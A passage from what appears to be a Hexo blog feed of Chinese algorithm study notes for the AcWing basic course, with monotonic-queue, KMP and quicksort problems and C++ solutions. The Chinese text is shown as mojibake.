ä¸ªæ•°å­—ã€‚</p><p>æ¯æ¬¡æ»‘åŠ¨çª—å£å‘å³ç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><p>è¯¥æ•°ç»„ä¸º <code>[1 3 -1 -3 5 3 6 7]</code>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>ã€‚</p><table><thead><tr><th style="text-align:center">çª—å£ä½ç½®</th><th style="text-align:center">æœ€å°å€¼</th><th style="text-align:center">æœ€å¤§å€¼</th></tr></thead><tbody><tr><td style="text-align:center">[1 3 -1] -3 5 3 6 7</td><td style="text-align:center">-1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">1 [3 -1 -3] 5 3 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">1 3 [-1 -3 5] 3 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">1 3 -1 [-3 5 3] 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">1 3 -1 -3 [5 3 6] 7</td><td style="text-align:center">3</td><td style="text-align:center">6</td></tr><tr><td style="text-align:center">1 3 -1 -3 5 [3 6 7]</td><td style="text-align:center">3</td><td style="text-align:center">7</td></tr></tbody></table><p>ä½ çš„ä»»åŠ¡æ˜¯ç¡®å®šæ»‘åŠ¨çª—å£ä½äºæ¯ä¸ªä½ç½®æ—¶ï¼Œçª—å£ä¸­çš„æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-5">è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥åŒ…å«ä¸¤è¡Œã€‚</p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œåˆ†åˆ«ä»£è¡¨æ•°ç»„é•¿åº¦å’Œæ»‘åŠ¨çª—å£çš„é•¿åº¦ã€‚</p><p>ç¬¬äºŒè¡Œæœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œä»£è¡¨æ•°ç»„çš„å…·ä½“æ•°å€¼ã€‚</p><p>åŒè¡Œæ•°æ®ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-5">è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºåŒ…å«ä¸¤ä¸ªã€‚</p><p>ç¬¬ä¸€è¡Œè¾“å‡ºï¼Œä»å·¦è‡³å³ï¼Œæ¯ä¸ªä½ç½®æ»‘åŠ¨çª—å£ä¸­çš„æœ€å°å€¼ã€‚</p><p>ç¬¬äºŒè¡Œè¾“å‡ºï¼Œä»å·¦è‡³å³ï¼Œæ¯ä¸ªä½ç½®æ»‘åŠ¨çª—å£ä¸­çš„æœ€å¤§å€¼ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-5">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>8 31 3 -1 -3 5 3 6 7</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-5">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>-1 -3 -3 -3 3 33 3 5 5 6 7</code></pre><h3 id="å•è°ƒé˜Ÿåˆ—-2">å•è°ƒé˜Ÿåˆ—</h3><p>å•è°ƒæ ˆ/é˜Ÿåˆ—é¢˜æ€è·¯ï¼š</p><ol><li>å…ˆç”¨æš´åŠ›å®ç°, ç”¨æ ˆ/é˜Ÿåˆ—æ¨¡æ‹Ÿ</li><li>åˆ é™¤æ— ç”¨å…ƒç´ </li><li>æœ‰æ— å•è°ƒæ€§, è¿›è¡Œä¼˜åŒ–(æ¯”å¦‚æŸ¥æ‰¾é—®é¢˜ç”¨äºŒåˆ†, æå€¼é—®é¢˜å–ç«¯ç‚¹)</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, k;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  </span><br><span class="line">  deque&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; a[q.<span class="built_in">back</span>()] &gt;= a[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">    q.<span class="built_in">push_back</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">    <span class="comment">// if (q.size() &gt; k) q.pop_front();  // ä¸å¯¹å–”, å•è°ƒé˜Ÿåˆ—ä¸­å¾ˆå¤šå€¼pop_backæ‰äº†</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q.<span class="built_in">front</span>()]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  q.<span class="built_in">clear</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; a[q.<span class="built_in">back</span>()] &lt;= a[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">    q.<span class="built_in">push_back</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q.<span class="built_in">front</span>()]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="KMP">KMP</h1><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>ï¼Œä»¥åŠä¸€ä¸ªæ¨¡å¼ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ï¼Œæ‰€æœ‰å­—ç¬¦ä¸²ä¸­åªåŒ…å«å¤§å°å†™è‹±æ–‡å­—æ¯ä»¥åŠé˜¿æ‹‰ä¼¯æ•°å­—ã€‚</p><p>æ¨¡å¼ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> åœ¨å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> ä¸­å¤šæ¬¡ä½œä¸ºå­ä¸²å‡ºç°ã€‚</p><p>æ±‚å‡ºæ¨¡å¼ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> åœ¨å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> ä¸­æ‰€æœ‰å‡ºç°çš„ä½ç½®çš„èµ·å§‹ä¸‹æ ‡ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-6">è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡Œè¾“å…¥æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> çš„é•¿åº¦ã€‚</p><p>ç¬¬äºŒè¡Œè¾“å…¥å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ã€‚</p><p>ç¬¬ä¸‰è¡Œè¾“å…¥æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> çš„é•¿åº¦ã€‚</p><p>ç¬¬å››è¡Œè¾“å…¥å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-6">è¾“å‡ºæ ¼å¼</h4><p>å…±ä¸€è¡Œï¼Œè¾“å‡ºæ‰€æœ‰å‡ºç°ä½ç½®çš„èµ·å§‹ä¸‹æ ‡ï¼ˆä¸‹æ ‡ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹è®¡æ•°ï¼‰ï¼Œæ•´æ•°ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚</p><h4 id="æ•°æ®èŒƒå›´-5">æ•°æ®èŒƒå›´</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>M</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1 \le M \le 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-6">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>3aba5ababa</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-6">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>0 2</code></pre><h1 id="Trie">Trie</h1><h1 id="å¹¶æŸ¥é›†">å¹¶æŸ¥é›†</h1><h1 id="å †">å †</h1><h1 id="å“ˆå¸Œè¡¨">å“ˆå¸Œè¡¨</h1>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•åŸºç¡€è¯¾ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>butterflyç›®å½•æ˜¾ç¤ºå¼‚å¸¸é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</title>
      <link href="/2022/12/25/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-butterfly%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2022/12/25/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-butterfly%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>ç¬”è€…ä¹‹å‰ä½“éªŒè¿‡ <code>NexT</code> ä¸»é¢˜ï¼Œç”±äº</p>]]></content>
      
      
      <categories>
          
          <category> è¸©å‘è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬1è®² åŸºç¡€ç®—æ³•</title>
      <link href="/2022/12/25/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-1-%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"/>
      <url>/2022/12/25/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-1-%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>æœ¬è®²ä»£ç æ¨¡æ¿ï¼š<a href="https://www.acwing.com/blog/content/277/">https://www.acwing.com/blog/content/277/</a></p><span id="more"></span><h1 id="å¿«é€Ÿæ’åº">å¿«é€Ÿæ’åº</h1><h2 id="AcWing-785-å¿«é€Ÿæ’åº"><a href="https://www.acwing.com/problem/content/787/">AcWing 785. å¿«é€Ÿæ’åº</a></h2><p>ç»™å®šä½ ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°åˆ—ã€‚</p><p>è¯·ä½ ä½¿ç”¨å¿«é€Ÿæ’åºå¯¹è¿™ä¸ªæ•°åˆ—æŒ‰ç…§ä»å°åˆ°å¤§è¿›è¡Œæ’åºã€‚</p><p>å¹¶å°†æ’å¥½åºçš„æ•°åˆ—æŒ‰é¡ºåºè¾“å‡ºã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥å…±ä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼ˆæ‰€æœ‰æ•´æ•°å‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> èŒƒå›´å†…ï¼‰ï¼Œè¡¨ç¤ºæ•´ä¸ªæ•°åˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºå…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ’å¥½åºçš„æ•°åˆ—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>53 1 2 4 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>1 2 3 4 5</code></pre><h3 id="é¢˜è§£">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = a[(l + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[++i] &lt; x) &#123;&#125;;  <span class="comment">// æ²¡æœ‰ i &lt; j</span></span><br><span class="line">    <span class="keyword">while</span> (a[--j] &gt; x) &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">quick_sort</span>(l, j);  <span class="comment">// j, è€Œéi</span></span><br><span class="line">  <span class="built_in">quick_sort</span>(j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">quick_sort</span>(<span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-786-ç¬¬kä¸ªæ•°"><a href="https://www.acwing.com/problem/content/788/">AcWing 786. ç¬¬kä¸ªæ•°</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°åˆ—ï¼Œä»¥åŠä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œè¯·ç”¨å¿«é€Ÿé€‰æ‹©ç®—æ³•æ±‚å‡ºæ•°åˆ—ä»å°åˆ°å¤§æ’åºåçš„ç¬¬ <span class="katex"><span class="katex-mathml"><math 